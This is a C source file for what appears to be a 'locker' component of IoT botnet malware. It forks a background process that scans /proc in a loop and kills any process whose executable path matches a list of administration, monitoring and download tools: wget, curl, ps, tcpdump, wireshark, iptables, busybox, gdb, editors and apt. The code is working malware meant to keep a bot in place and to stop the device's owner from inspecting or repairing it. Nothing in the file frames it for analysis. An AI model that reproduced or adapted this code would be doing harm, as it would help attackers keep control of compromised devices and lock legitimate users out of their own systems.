#define _GNU_SOURCE

#include <stdio.h>
#include <stdbool.h>
#include <string.h>
#include <unistd.h>
#include <stdlib.h>
#include <arpa/inet.h>
#include <linux/limits.h>
#include <sys/types.h>
#include <dirent.h>
#include <signal.h>
#include <fcntl.h>
#include <time.h>

#include "headers/util.h"
#include "headers/includes.h"

int i, locker_pid;

void locker_kill(void) {
    if (locker_pid != 0)
        kill(locker_pid, 9);
}

void locker_init(void)
{
    struct dirent *file = NULL;

    locker_pid = fork();

    if (locker_pid != 0)
        return;

    #ifdef DEBUG
    printf("[locker/init]: started locker scanner (pid: %d", locker_pid);
    #endif

    while (1) {
        // opens the dir directory
        DIR *dir = opendir("/proc/");
        if (!dir) {
            #ifdef DEBUG
            printf("[locker/err]: failed to open /proc");
            #endif
            exit(1);
        }

        while ((file = readdir(dir)) != NULL ) {
            if (*file->d_name < '0' || *file->d_name > '9')
                continue;

            char exe_path[32];
            char realpath[4096];
            int rp_len, pid = strtol(file->d_name, NULL, 10);

            if (pid == getppid() || pid == getpid())
                continue;

            snprintf(exe_path, sizeof(exe_path), "/proc/%d/exe", pid);

            // readlink() for killer since it wont be read using read()
            if ((rp_len = readlink(exe_path, realpath, sizeof (realpath) - 1)) != -1) {
                realpath[rp_len] = 0;

                // checking if string is in exe
                if (util_stristr(realpath, "wget")      != 0 ||
                    util_stristr(realpath, "curl")      != 0 ||
                    util_stristr(realpath, "ping")      != 0 ||
                    util_stristr(realpath, "/ps")       != 0 ||
                    util_stristr(realpath, "wireshark") != 0 ||
                    util_stristr(realpath, "tcpdump")   != 0 ||
                    util_stristr(realpath, "python")    != 0 ||
                    util_stristr(realpath, "busybox")   != 0 ||
                    util_stristr(realpath, "iptables")  != 0 ||
                    util_stristr(realpath, "nano")      != 0 ||
                    util_stristr(realpath, "nvim")      != 0 ||
                    util_stristr(realpath, "vim")       != 0 ||
                    util_stristr(realpath, "gdb")       != 0 ||
                    util_stristr(realpath, "apt")       != 0)
                {
                    #ifdef DEBUG
                    printf("[locker/kill]: killed (pid: %s, realpath: %s)\n", file->d_name, realpath);
                    #endif
                    kill(pid, 9);
                } else {
                    continue;
                }
            }
        }

        closedir(dir);
        usleep(10 * 10000);
    }
}
